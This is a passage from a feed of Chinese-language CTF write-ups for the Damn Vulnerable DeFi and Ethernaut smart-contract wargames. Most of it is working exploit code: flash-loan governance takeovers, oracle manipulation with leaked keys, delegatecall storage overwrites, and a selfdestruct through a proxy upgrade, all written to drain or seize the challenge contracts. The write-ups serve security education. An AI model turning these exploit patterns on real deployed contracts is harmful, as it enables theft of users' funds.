(wbtc.balanceOf(address(moneyMarket)) &gt;= 1e18) {            moneyMarket.withdraw(address(wbtc), amount);        }    }    function pwn() external {        usdcBtcPair.swap(0, 10e18, address(this), new bytes(1));    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解（中）</title>
      <link href="/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/"/>
      <url>/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解-中"><a href="#Damn-Defi-题解-中" class="headerlink" title="Damn Defi 题解(中)"></a>Damn Defi 题解(中)</h1><h2 id="selfi"><a href="#selfi" class="headerlink" title="selfi"></a>selfi</h2><p>一个提供DVT代币的闪电贷，池中有一百五十万个DVT。我们身无分文，但是我们需要拿走全部的DVT。<br>这个题和以往的题唯一不同的地方，就是多了一个治理机制。</p><p>SelfiePool：这个池里有一个闪电贷的函数，同时有一个可以转出所有资金的函数drainAllFunds()，但是只能被治理合约所调用。</p><p>SimpleGovernance：这就是之前提到的治理合约，queueAction函数会验证你是否拥有足够的token，当你拥有了矿池中半数以上的DVT代币后（我们现在有闪借池，这点很容易绕过），在两天之后输入你的id即可在executeAction中执行该调用。</p><p>很明显，我们可以通过executeAction函数中去执行闪电贷合约中的drainAllFunds函数，即可绕开onlyGovernance的限定。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "./SimpleGovernance.sol";import "./SelfiePool.sol";import "../DamnValuableTokenSnapshot.sol";contract SelfieExploit {    SimpleGovernance public goverance;    SelfiePool public pool;    address attcker;    uint256 actionId;    constructor(address _pool, address _goverance){        pool = SelfiePool(_pool);        goverance = SimpleGovernance(_goverance);        attcker = msg.sender;    }    function exploit (uint256 _amount) public {        pool.flashLoan(_amount);    }    function receiveTokens (address _token, uint256 amount) external {        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);        token.snapshot();        actionId = goverance.queueAction(address(pool),            abi.encodeWithSignature(                "drainAllFunds(address)",                attcker            ),            0);         token.transfer(address(pool), amount);    }    function drainToAttacker() external {        goverance.executeAction(actionId);    }    receive () external payable {}}</code></pre><h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><p>一个交易所在售卖一种代币DVNFT，每个价值999ETH，要我们以0.1ETH的余额来拿走交易所中全部的ETH。</p><p> Exchange：一个简单的交易所。</p><p> TrustfulOracle：一个预言机合约。这个预言机值得我们仔细阅读。这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过postPrice()来设定自己的价格，而getMedianPrice()是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。因为只有初始化的三个可信报告者可以定价，所以我们如果能够控制这2个地址，就能够随意的更改价格。</p><p> 题目中给的两串十六进制数，先用ascii码转化，再用base64解码就可以得到三个账户中其中两个的私钥。<br>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9<br>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {               /** CODE YOUR EXPLOIT HERE */       //用二者私钥创建钱包       const sources1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);       const sources2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);       //将NFT价格设置为1wei       await this.oracle.connect(sources1).postPrice("DVNFT", 1);       await this.oracle.connect(sources2).postPrice("DVNFT", 1);       //买入       await this.exchange.connect(attacker).buyOne({value:1});       //重新将价格设置为exchange合约的总余额       _balance =  ethers.provider.getBalance(this.exchange.address);       await this.oracle.connect(sources1).postPrice("DVNFT", _balance);       await this.oracle.connect(sources2).postPrice("DVNFT", _balance);       //卖出       await this.nftToken.connect(attacker).approve(this.exchange.address, 0);       await this.exchange.connect(attacker).sellOne(0);   });</code></pre><h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><p> 有一个借贷池在借贷DVT，池中有十万DYT,题直接通过abi引用了一个已经编译了的Uniswap v1的合约,我们需要以25ETH和1000DVT的余额拿走借贷池中的所有代币。</p><p> 写这题我们先要了解Uniswap v1。可以看看这个<a href="https://zhuanlan.zhihu.com/p/552867213">传送门</a>。</p><p> 在了解了uniswap v1后，我们就应该知道，题中没有足够多的流动性来应对大规模的买进卖出。因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {      await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);      // 在交易所置换自己所有的token      await this.uniswapRouter.connect(attacker).swapExactTokensForETH(          ATTACKER_INITIAL_TOKEN_BALANCE,          0,          [this.token.address, this.uniswapRouter.WETH()],          attacker.address,          9999999999      );            console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());      //计算borrow所有token所需要的eth      const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);      //先往钱包里存钱      await this.weth.connect(attacker).deposit({value:amount});      await this.weth.connect(attacker).approve(this.lendingPool.address, amount);      await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);  });</code></pre><h2 id="Puppet-V2"><a href="#Puppet-V2" class="headerlink" title="Puppet V2"></a>Puppet V2</h2><p>这次题目采用了uniswapv2，我们有20ETH和10000DVT代币，需要我们讲借贷池中的100万DVT代币全部拿走。</p><p>这题虽然用了uniswapv2，但是和上一题差别不大。思路也一样。</p><h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);       // 在交易所置换自己所有的token       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(           ATTACKER_INITIAL_TOKEN_BALANCE,           0,           [this.token.address, this.uniswapRouter.WETH()],           attacker.address,           9999999999       );              console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());       //计算borrow所有token所需要的eth       const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);       //先往钱包里存钱       await this.weth.connect(attacker).deposit({value:amount});       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);   });</code></pre><h2 id="Free-Rider"><a href="#Free-Rider" class="headerlink" title="Free Rider"></a>Free Rider</h2><p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p><p>本题的关键就是这2串代码</p><pre class=" language-1"><code class="language-1">_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); payable(_token.ownerOf(tokenId)).sendValue(priceToPay);</code></pre><p> 这存在很明显的逻辑漏洞。在nft从owner转给我们之后，再将用于购买的eth又发给了代币拥有者，但这时的代币拥有者已经变成了买家，所以等于买家没花任何钱就买到了nft。</p><h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {       const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);       const attackContract = await AttackFactory.deploy(           this.weth.address,            this.uniswapFactory.address,           this.token.address,           this.marketplace.address,           this.buyerContract.address,           this.nft.address,           );       await attackContract.flashSwap(this.weth.address, NFT_PRICE, {           gasLimit: 1e6       });   });</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解（上）</title>
      <link href="/2023/02/24/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
      <url>/2023/02/24/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解（上）"><a href="#Damn-Defi-题解（上）" class="headerlink" title="Damn Defi 题解（上）"></a>Damn Defi 题解（上）</h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>题目给了一个闪电贷合约，要求我们停止这个闪电贷合约继续运行。<br>可以注意到这个闪电贷函数是有明显问题的。</p><pre class=" language-1"><code class="language-1">if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></pre><p>convertToShares(totalSupply) != balanceBefore;这个判断不严谨。<br>而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加.这就会造成此闪电贷池宕机。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我们只需要向该合约提交一笔转账即可。</p><pre class=" language-1"><code class="language-1">await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );</code></pre><h2 id="naive-reciever"><a href="#naive-reciever" class="headerlink" title="naive-reciever"></a>naive-reciever</h2><p>借贷池中有一千个eth，而用户拥有十个eth，我们要做的就是将用户的这十个ETH掏空。<br>这个flashloan函数只要被调用一次就会抽取1ETH的小费。但是接收器没有判断消息的发送者是否为msg.sender。</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>只需要循环调用flashloan函数即可</p><pre class=" language-1"><code class="language-1">for(let i = 0; i < 10; i++){            await this.pool.connect(attacker).flashLoan            (thisreceiver.address, "0");        }</code></pre><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>题目要求我们取走闪电贷合约的一百万的余额。我们开始没有币。<br>这是一个关于外部调用的一个漏洞。<br>ReentrancyGuard并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。<br>解题关键是这串代码。</p><pre class=" language-1"><code class="language-1">target.functionCall(data);</code></pre><p>functioncall函数是由Address.sol提供的一个调用方法。<br>那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池approve给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>js:</p><pre class=" language-1"><code class="language-1">it('Exploit', async function () {    // 计算我们要的data;        const data = web3.eth.abi.encodeFunctionCall(            {                name: 'approve',                type: 'function',                inputs: [                    {                        type: 'address',                        name: 'addr'                    },                    {                        type: 'uint256',                        name: 'amount'                    }                ]            },[attacker.address, TOKENS_IN_POOL]        );        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);    });</code></pre><p>soildity:</p><pre class=" language-1"><code class="language-1">    pragma solidity ^0.8.0;import "./TrusterLenderPool.sol";import "@openzeppelin/contracts/token/ERC20/IERC20.sol";interface ITrusterLenderPool{    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;}contract TrusterExploit{    ITrusterLenderPool cons;    uint256 balanceOfPool;    address tokenAdr;    address poolAdr;    constructor(address _pool, uint256 BalanceOfPool, address _token){        cons = ITrusterLenderPool(_pool);        poolAdr = _pool;        balanceOfPool = BalanceOfPool;        tokenAdr = _token;    }    function attack() public {        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature("approve(address,uint256)", address(this), balanceOfPool));        IERC20 token = IERC20(tokenAdr);        token.transferFrom(poolAdr, msg.sender,balanceOfPool);    }}</code></pre><h2 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h2><p>一个借贷池有一千ETH余额，我们将借贷池掏空。<br>通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘。<br>我们可以在运行IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()中，在接到钱后，用 deposit() 函数存钱，我们就可以通过<br>if (address(this).balance &lt; balanceBefore)<br>            revert RepayFailed();<br>    }<br>之后再取。</p><h3 id="Expolit"><a href="#Expolit" class="headerlink" title="Expolit"></a>Expolit</h3><p>solidity</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "./SideEntranceLenderPool.sol";// interface IFlashLoanEtherReceiver {//     function execute() external payable;// }contract SideEntranceExploit is IFlashLoanEtherReceiver{    SideEntranceLenderPool pool;    address payable attacker;    constructor(address _pool){        pool = SideEntranceLenderPool(_pool);        attacker = payable(msg.sender);    }    function attack(uint256 _amount) public{        pool.flashLoan(_amount);        pool.withdraw();    }    function execute() external payable override {        pool.deposit{value:address(this).balance}();    }        receive() external payable{        attacker.transfer(address(this).balance);    }}</code></pre><p>js</p><pre class=" language-1"><code class="language-1">it('Exploit', async function () {        const SideEntranceLenderAttackFactory = await ethers.getContractFactory("sideEntranceLenderAttack",attacker)        const attack = await SideEntranceLenderAttackFactory.deploy(this.pool.address)        await attack.connect(attacker).attack(ETHER_IN_POOL)        await attack.connect(attacker).withdraw()    });</code></pre><h2 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h2><p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。，而我们没有DVT代币，却也希望得到奖励。</p><p>RewardToken:<br>这是一个的ERC20的Token,唯一的区别就是这个奖励币可以被无限铸.</p><p>AccountingToken:<br>这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。</p><p>TheRewarderPool:<br>这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。</p><p>FlashLoanerPool:这是比较常见的闪电贷池。但是，出现了外部调用。  msg.sender.functionCall(abi.encodeWithSignature(“receiveFlashLoan(uint256)”, amount));我们可能利用receiveFlashLoan()函数干一些坏事。<br>那我们的思路已经很明确了，就是在闪电贷合约中借钱，然后存入矿池中，继而得到奖励代币，再将奖励代币发送给attacker，然后将钱返还给闪电贷合约，即可完成攻击。</p><h3 id="Expolit-1"><a href="#Expolit-1" class="headerlink" title="Expolit"></a>Expolit</h3><p>solidity</p><pre class=" language-1"><code class="language-1">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import "./RewardToken.sol";import "../DamnValuableToken.sol";import "./TheRewarderPool.sol";import "./FlashLoanerPool.sol";contract rewardAttack {    RewardToken rewardTO;    TheRewarderPool rewardPool;    DamnValuableToken liquidToken;    FlashLoanerPool flashPool;    constructor(        address rt,        address rp,        address lt,        address fl    ) public {        rewardTO = RewardToken(rt);        rewardPool = TheRewarderPool(rp);        liquidToken = DamnValuableToken(lt);        flashPool = FlashLoanerPool(fl);    }    function attack() public {        uint256 amount = liquidToken.balanceOf(address(flashPool));        flashPool.flashLoan(amount);    }    function receiveFlashLoan(uint256 amount) public {        liquidToken.approve(address(rewardPool), amount);        rewardPool.deposit(amount);        rewardPool.withdraw(amount);        liquidToken.transfer(address(flashPool), amount);    }    function complete() public {        rewardTO.transfer(msg.sender, rewardTO.balanceOf(address(this)));    }    fallback() external payable {}}</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这应该是所有希望激励用户存款的系统都会面临的漏洞。你的协议可能希望激励长期质押，而不是短期套利交易。因此，最好是摆脱回合，根据存款的每一秒来计算奖励</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录(下)</title>
      <link href="/2022/12/17/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2022/12/17/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解——摘录-下"><a href="#Ethernaut题解——摘录-下" class="headerlink" title="Ethernaut题解——摘录(下)"></a>Ethernaut题解——摘录(下)</h1><h2 id="Dex-And-Dex-Two"><a href="#Dex-And-Dex-Two" class="headerlink" title="Dex And Dex Two"></a>Dex And Dex Two</h2><p>这两题大差不差，题意就是玩家账户上的 token1 和 token2 都各有 10 个 token，而题目账户上每种有 100 个，题1目的是把题目账户上的某个 token 清零。<br>题2目的是把题目账户上都 token 清零。</p><p>题1的漏洞点在于，在计算每次交换的代币数量时，getSwapPrice函数内部使用了除法，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币，从而达到清空题目合约拥有代币数的目的。</p><pre class=" language-1"><code class="language-1">token1 = (await contract.token1())token2 = (await contract.token2())await contract.swap(token1,token2,10)await contract.swap(token2,token1,20)await contract.swap(token1,token2,24)await contract.swap(token2,token1,30)await contract.swap(token1,token2,41)await contract.swap(token2,token1,45)</code></pre><p>题2与题1明显没有 </p><pre class=" language-1"><code class="language-1">require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");</code></pre><p>也就是说可以有第3方token进入。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.6.0;import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";contract Mytoken is ERC20 {    address public target;  constructor(string memory name,              string memory symbol,              uint256 number) public ERC20(name, symbol) {             _mint(msg.sender, number);            }}</code></pre><p>设置number为200，也就是让我们初始拥有200个恶意token。。然后approve题目地址，并转给题目地址100个token，这样我们和题目合约初始情况下各拥有100个恶意合约的token。</p><p>然后执行</p><pre class=" language-1"><code class="language-1">await contract.approve(player,1000)await contract.approve(contract.address,1000)token1 = (await contract.token1())token2 = (await contract.token2())// mytoken1和mytoken2分别对应2个部署的恶意合约的地址mytoken1 =mytoken2 =await contract.swap(mytoken1,token1,100)await contract.swap(mytoken2,token2,100)</code></pre><h2 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h2><p>本题要我们成为admin。</p><p>本题使用了代理模式。因此它有一个很大的撞库风险。所以如果我们想修改admin其实可以从maxBalance入手。 而想要通过setMaxBalance修改maxBalance有一个先决条件，那就是在白名单中。而要添加到白名单，需要调用addToWhitelist，这又需要require(msg.sender == owner, “Not the owner”);所以我们可以先通过修改pendingAdmin修改owner。大致思路就是这样。</p><p>先手动调用proposeNewAdmin。</p><pre class=" language-1"><code class="language-1">functionSignature = {    name: 'proposeNewAdmin',    type: 'function',    inputs: [        {            type: 'address',            name: '_newAdmin'        }    ]}params = [player]data = web3.eth.abi.encodeFunctionCall(functionSignature, params)await web3.eth.sendTransaction({from: player, to: instance, data})</code></pre><p>在将自己加入白名单。</p><pre class=" language-1"><code class="language-1">await contract.proposeNewAdmin(player)</code></pre><p>要修改maxBalance，就需要使合约余额清0。我们看multicall函数，它的作用是同时进行多次函数调用，但是deposit函数除外。由于这里使用了selector来比较，那么我们只需要换个方式调用deposit函数即可绕过。我们可调用deposit和multicall(deposit)。</p><pre class=" language-1"><code class="language-1">depositData = await contract.methods["deposit()"].request().then(v => v.data)multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)await contract.multicall([depositData, multicallData], {value: toWei('0.001')})await contract.execute(player,toWei('0.002'),0x0)</code></pre><p>设定maxBalance</p><pre class=" language-1"><code class="language-1">await contract.setMaxBalance(player)</code></pre><h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><p>本题要求我们去使engine合约自毁。</p><p>因为整个合约中都没有 selfdestruct，所以要upgradeToAndCall函数更新合约。需要通过 _authorizeUpgrade 函数的检查。这个可以通过 initialize 函数完成。</p><pre class=" language-1"><code class="language-1">> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")'0x000000000000000000000000<engine address>'> engine = "0x<engine address>"> data = web3.utils.sha3("initialize()").slice(0, 10)'0x8129fc1c'> web3.eth.sendTransaction({from: player, to: engine, data: data})> await web3.eth.call({from: player, to: engine, data: web3.utils.sha3("upgrader()").slice(0, 10)}) // 验证 upgrader'0x000000000000000000000000<player address>'> exp = "<Exploit contract address>"> expdata = web3.utils.sha3("exp()").slice(0, 10)'0xab60ffda'> signature = {    name: 'upgradeToAndCall',    type: 'function',    inputs: [        {            type: 'address',            name: 'newImplementation'        },        {            type: 'bytes memory',            name: 'data'        }    ]}{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}> data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'> web3.eth.sendTransaction({from: player, to: engine, data: data})</code></pre><pre class=" language-1"><code class="language-1">pragma solidity ^0.6.0;contract Exploit {    function exp() public {        selfdestruct(payable(0));    }}</code></pre><h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><p>本题要求我们写一个合约来维护它。</p><p>CryptoVault：提供一个sweepToken方法，允许任何人转代币。该函数内部的唯一检查是，你不能转移Vault的underlying代币。underlying代币DoubleEntryPoint。</p><p>LegacyToken.sol：它有一个transfer函数，当delegate不为0是调用delegate.delegateTransfer(to, value, msg.sender);delegate就是DoubleEntryPoint合约。</p><p>漏洞很明显sweepToken 只阻止了 底层 DoubleEntryPoint 的转账。但我们可以通过LegacyToken.transfer1取。</p><pre class=" language-1"><code class="language-1">function exploitLevel() internal override {    vm.startPrank(player, player);    DetectionBot bot = new DetectionBot(        level.cryptoVault(),        abi.encodeWithSignature("delegateTransfer(address,uint256,address)")    );    monitor the `DoubleEntryPoint` contract    level.forta().setDetectionBot(address(bot));    vm.stopPrank();}</code></pre><h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><p>本题要求我们取完Wallet中的coin。</p><p>想要取完，就要调用transferRemainder。由我们自己直接调用肯定是行不通的。但我们看requestDonation函数，会执行donate10函数，当执行失败后，会检测错误，若为NotEnoughBalance()，就会调transferRemainder。那如何做呢？ if (coin.balances(address(this)) &lt; 10)此条件明显办不到。我们看这一串代码。</p><pre class=" language-1"><code class="language-1">      if(dest_.isContract()) {                // notify contract                 INotifyable(dest_).notify(amount_);            }</code></pre><p>当dest_为合约是会调用它的notify函数。</p><p>到这思路已经清晰了。用合约调requestDonation函数，在notify函数中报错，返回<br>NotEnoughBalance()。</p><pre class=" language-1"><code class="language-1">pragma solidity >=0.8.0 <0.9.0;contract attack {    uint256 number=100;     error NotEnoughBalance();     function notify(uint256 amount) external{         if(amount<number){               revert NotEnoughBalance();         }     }}</code></pre><h2 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h2><p>本题要求我们通过3个gates，成为entrant。</p><p>gateone: 这个我们可以让过度合约成为owner在通过调过度合约去绕过。要想成为owner,就要通过construct0r函数（额，有点小丑）。</p><p>gatetwo：这个也很简单，只要用合约跟它交互，就可以得到password。也可以用web3.js直接查。</p><p>gatethree：这个也简单，在owner中的收款函数中加个revert让交易回滚就行。</p><p>得到pass2word。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract getpassword {    SimpleTrick public trick ;    constructor (address  _target) {        trick = SimpleTrick(_target);    }    uint public passwords;    function att(uint _passwords) public {        passwords =  block.timestamp;        trick.checkPassword(_passwords);    }}</code></pre><pre class=" language-1"><code class="language-1">contract attack{     GatekeeperThree public target;     constructor (address payable _target) {        target = GatekeeperThree(_target);  }     function passone() public {        target.construct0r();    }     function passtwo(uint number) public {         target.getAllowance(number);     }     function attack () public {         target.enter();     }     receive() external payable {       revert();    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录(中)</title>
      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%AD)/"/>
      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解——摘录-中"><a href="#Ethernaut题解——摘录-中" class="headerlink" title="Ethernaut题解——摘录(中)"></a>Ethernaut题解——摘录(中)</h1><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Preservation {  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  }   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public {    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public {    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }}// Simple library contract to set the timecontract LibraryContract {  // stores a timestamp   uint storedTime;    function setTime(uint _time) public {    storedTime = _time;  }}</code></pre><p>目标是拿到合约的所有权。但是从题目合约中看不到任何和更改 owner 有关的函数。<br>本题的关键点在于delegatecall。</p><p>通过delegatecall来调用另一个合约的函数并不会动用另一个合约的storage，而是使用本地storage。这就导致了在 setFirstTime函数中调用setTime函数时更改storedTime实际上会更改处于storage中相同位置timeZone1Library。这样在下一次调用setFirstTime的时候就会调用另一个地址合约的setTime函数。<br>因此可以部署一个攻击合约，其中实现 setTime 函数，里面将 owner 改为输入（注意要将攻击合约的内存布局搞的和 Preservation 合约相同）</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    address public timeZone1Library;    address public timeZone2Library;    address public owner;             // 保证这前面有两个 address    function setTime(uint _time) public {        owner = address(_time);    }}</code></pre><h2 id="recovery"><a href="#recovery" class="headerlink" title="recovery"></a>recovery</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Recovery {  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public {    new SimpleToken(_name, msg.sender, _initialSupply);    }}contract SimpleToken {  string public name;  mapping (address => uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) {    name = _name;    balances[_creator] = _initialSupply;  }  // collect ether in return for tokens  receive() external payable {    balances[msg.sender] = msg.value * 10;  }  // allow transfers of tokens  function transfer(address _to, uint _amount) public {     require(balances[msg.sender] >= _amount);    balances[msg.sender] = balances[msg.sender] - _amount;    balances[_to] = _amount;  }  // clean up after ourselves  function destroy(address payable _to) public {    selfdestruct(_to);  }}</code></pre><p>题意是instance调用 generateToken生成了一个 SimpleToken，但是不知道生成的合约地址，现在要调用这个合约的selfdestruct来将其中余额转到player账户中。<br>因为区块链都是透明的，可以直接去Etherscan的Rinkeby网络中查找。<br>所以写一个攻击合约来调用那个地址上的的destroy函数就好了</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract attack {    address payable target;    address payable myaddr;    constructor(address payable _addr, address payable _myaddr) public {        target=_addr;        myaddr=_myaddr;    }    function exploit() public{        target.call(abi.encodeWithSignature("destroy(address)",myaddr));    }}</code></pre><h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.5.0;import '../helpers/Ownable-05.sol';contract AlienCodex is Ownable {  bool public contact;  bytes32[] public codex;  modifier contacted() {    assert(contact);    _;  }    function make_contact() public {    contact = true;  }  function record(bytes32 _content) contacted public {    codex.push(_content);  }  function retract() contacted public {    codex.length--;  }  function revise(uint i, bytes32 _content) contacted public {    codex[i] = _content;  }}</code></pre><p>题目要求拿到合约的所有权。</p><p>这有跟内存有关。这个owner的存储是在Ownable中定义的，它会和contac一起放在 storage的slot0处。</p><p>由于还没有往数组里写东西，所以slot1为0。</p><p>整体思路就是，通过record函数往动态数组里写东西，算出可以覆盖的i值，然后覆盖掉就可以了。</p><p>因为codex[i] 实际上是表示keccak256(slot of codex)+i处，所以只要令i=2<em>256-keccak2</em>56(slot of codex)就可以使其变为2<strong>256，即溢出到0的位置<br>而codex的slot就是1，所以只需要计算2</strong>256-keccak256(1)。</p><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Denial {    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public {        partner = _partner;    }    // 